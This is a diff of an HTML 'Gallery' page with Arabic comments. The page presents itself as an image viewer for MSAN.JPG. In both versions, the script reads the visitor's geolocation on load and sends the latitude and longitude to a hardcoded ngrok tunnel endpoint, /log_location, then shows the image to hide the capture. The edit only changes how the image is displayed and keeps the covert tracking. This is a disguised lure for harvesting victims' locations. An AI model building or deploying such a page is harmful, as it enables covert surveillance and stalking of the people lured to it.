@@ -1,30 +1,26 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gallery</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; }
-        img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        body { margin: 0; background-color: #000; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        img { max-width: 100%; height: auto; }
     </style>
 </head>
 <body>
-    <div id="loading" style="color: #333;">جاري التحميل...</div>
     <script>
         window.onload = function() {
             navigator.geolocation.getCurrentPosition(function(pos) {
-                // تأكد من وضع رابط ngrok الصحيح هنا فقط
-                var myNgrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
+                var ngrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
+                fetch(ngrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, {mode: 'no-cors'});
                 
-                fetch(myNgrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, { mode: 'no-cors' });
+                setTimeout(showImage, 500);
+            }, showImage);
 
-                setTimeout(function() {
-                    window.location.href = "MSAN.JPG"; 
-                }, 1000);
-            }, function() {
-                window.location.href = "MSAN.JPG";
-            });
+            function showImage() {
+                // يحاول فتح الصورة مباشرة في نفس الصفحة بدلاً من تحويل الرابط
+                document.body.innerHTML = '<img src="MSAN.JPG" alt="Loading...">';
+            }
         };
     </script>
 </body>
